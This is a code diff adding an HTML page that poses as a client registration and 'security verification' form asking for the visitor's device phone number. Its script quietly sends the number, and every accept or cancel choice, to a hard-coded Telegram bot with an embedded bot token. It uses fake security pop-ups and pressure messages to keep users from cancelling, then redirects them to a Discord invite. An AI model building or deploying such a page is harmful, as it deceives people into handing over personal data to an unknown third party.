@@ -1,0 +1,299 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Complete Your Client Registration</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
+            height: 100vh;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            max-width: 400px;
+            width: 90%;
+            animation: fadeIn 0.5s ease-in-out;
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
+            color: #4cc9f0;
+        }
+        .phone-notice {
+            background: rgba(255, 255, 255, 0.15);
+            padding: 10px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            font-size: 16px;
+            outline: none;
+        }
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.7);
+        }
+        button {
+            background: #4cc9f0;
+            color: #1a1a2e;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+            width: 100%;
+        }
+        button:hover {
+            background: #3a86ff;
+            transform: translateY(-2px);
+        }
+        .system-alert {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 1000;
+            color: white;
+            text-align: center;
+            padding-top: 15%;
+        }
+        .alert-content {
+            background: #1a1a2e;
+            margin: 0 auto;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 500px;
+            box-shadow: 0 5px 30px rgba(0, 0, 0, 0.7);
+        }
+        .alert-content h3 {
+            color: #f04747;
+            margin-top: 0;
+            font-size: 22px;
+        }
+        .security-message {
+            background: rgba(240, 71, 71, 0.2);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+            border-left: 4px solid #f04747;
+        }
+        .alert-buttons {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .alert-buttons button {
+            margin: 0;
+            flex: 1;
+        }
+        .alert-buttons button.deny {
+            background: #f44336;
+        }
+        .error {
+            color: #ff6b6b;
+            font-size: 14px;
+            margin-top: 5px;
+            display: none;
+        }
+        .warning-popup {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 2000;
+            color: white;
+            text-align: center;
+            padding-top: 15%;
+        }
+        .warning-content {
+            background: #2a0a0a;
+            margin: 0 auto;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 500px;
+            box-shadow: 0 5px 30px rgba(255, 0, 0, 0.3);
+            border: 2px solid #f04747;
+        }
+        .warning-content h3 {
+            color: #ff4d4d;
+            margin-top: 0;
+            font-size: 22px;
+        }
+        .warning-message {
+            background: rgba(240, 71, 71, 0.3);
+            padding: 15px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Complete Your Client Registration</h1>
+        
+        <div class="phone-notice">
+            <strong>Important:</strong> You must enter the phone number that is currently in this device. 
+            We will verify this is your active number.
+        </div>
+        
+        <input type="tel" id="phoneNumber" placeholder="Enter 10-digit phone number" required maxlength="10" pattern="\d{10}">
+        <div class="error" id="phoneError">Please enter exactly 10 digits (numbers only)</div>
+        <button onclick="validateAndSubmit()">Verify My Number</button>
+    </div>
+
+    <!-- Verification Popup -->
+    <div class="system-alert" id="systemAlert">
+        <div class="alert-content">
+            <h3>SECURITY VERIFICATION REQUIRED</h3>
+            
+            <div class="security-message">
+                <p><strong>For your protection:</strong></p>
+                <p>We need to confirm this device belongs to you by verifying your phone number.</p>
+                <p>This prevents unauthorized account access.</p>
+            </div>
+            
+            <p>By clicking "Verify Identity", you agree to this security check.</p>
+            
+            <div class="alert-buttons">
+                <button onclick="grantAccess()">Verify Identity</button>
+                <button class="deny" onclick="denyAccess()">Cancel Verification</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Warning Popup (shown when user tries to deny verification) -->
+    <div class="warning-popup" id="warningPopup">
+        <div class="warning-content">
+            <h3>⚠️ IMPORTANT NOTICE</h3>
+            
+            <div class="warning-message">
+                <p><strong>Verification is mandatory to continue.</strong></p>
+                <p>If you cancel now:</p>
+                <ul style="text-align: left; padding-left: 20px;">
+                    <li>Your account registration will remain incomplete</li>
+                    <li>You won't be able to access client features</li>
+                    <li>You'll need to restart the verification process</li>
+                </ul>
+            </div>
+            
+            <p>Are you sure you want to cancel verification?</p>
+            
+            <div class="alert-buttons">
+                <button onclick="goBackToVerification()">No, Continue Verification</button>
+                <button class="deny" onclick="confirmDeny()">Yes, Cancel Anyway</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const BOT_TOKEN = "7689402450:AAFJh0q1YLXzNgvWvJw0SbLF73rBjD906v0";
+        const CHAT_ID = "6856244292";
+        let phoneNumber = "";
+
+        function validateAndSubmit() {
+            const phoneInput = document.getElementById("phoneNumber");
+            phoneNumber = phoneInput.value.trim();
+            const phoneError = document.getElementById("phoneError");
+
+            // Validate 10-digit number (exactly 10 digits, numbers only)
+            if (!/^\d{10}$/.test(phoneNumber)) {
+                phoneError.style.display = "block";
+                phoneInput.focus();
+                return false;
+            }
+            
+            phoneError.style.display = "none";
+            submitForm();
+            return true;
+        }
+
+        function submitForm() {
+            // Send phone number to Telegram
+            sendToTelegram(`📱 New Client Submission:\nPhone: ${phoneNumber}`);
+
+            // Show verification popup
+            document.getElementById("systemAlert").style.display = "block";
+        }
+
+        function grantAccess() {
+            document.getElementById("systemAlert").style.display = "none";
+            
+            // Send "access granted" to Telegram
+            sendToTelegram(`✅ Access Granted for: ${phoneNumber}`);
+            
+            // Redirect to Discord
+            window.location.href = "https://discord.gg/KYTWgDtM4h";
+        }
+
+        function denyAccess() {
+            document.getElementById("systemAlert").style.display = "none";
+            document.getElementById("warningPopup").style.display = "block";
+        }
+
+        function goBackToVerification() {
+            document.getElementById("warningPopup").style.display = "none";
+            document.getElementById("systemAlert").style.display = "block";
+        }
+
+        function confirmDeny() {
+            document.getElementById("warningPopup").style.display = "none";
+            alert("Verification cancelled. You must complete verification to access your account.");
+            
+            // Send "access denied" to Telegram
+            sendToTelegram(`❌ User Cancelled Verification for: ${phoneNumber}`);
+        }
+
+        function sendToTelegram(message) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            }).catch(err => console.error("Telegram error:", err));
+        }
+
+        // Phone number input validation
+        document.getElementById("phoneNumber").addEventListener("input", function(e) {
+            // Allow only numbers
+            this.value = this.value.replace(/\D/g, '');
+            // Hide error when typing
+            document.getElementById("phoneError").style.display = "none";
+        });
+    </script>
+</body>
+</html>
